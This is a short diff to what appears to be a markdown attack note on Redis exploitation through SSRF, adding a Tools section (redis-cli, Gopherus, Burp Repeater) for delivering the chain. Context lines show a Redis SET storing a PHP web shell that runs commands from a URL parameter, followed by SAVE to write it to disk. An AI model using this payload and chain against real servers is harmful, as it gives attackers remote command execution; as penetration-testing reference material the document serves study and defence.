@@ -79,6 +79,12 @@ SET x "\n<?php system($_GET['c']);?>\n"
 SAVE
 ```
 
+## Tools
+
+- **redis-cli**: run the CONFIG SET, SET, and SAVE write-to-disk chain.
+- **Gopherus**: build the gopher:// payload that smuggles the chain over SSRF.
+- **Burp Repeater**: deliver the SSRF URL carrying the chain.
+
 ## References
 
 - [Redis: CONFIG SET](https://redis.io/docs/latest/commands/config-set/)
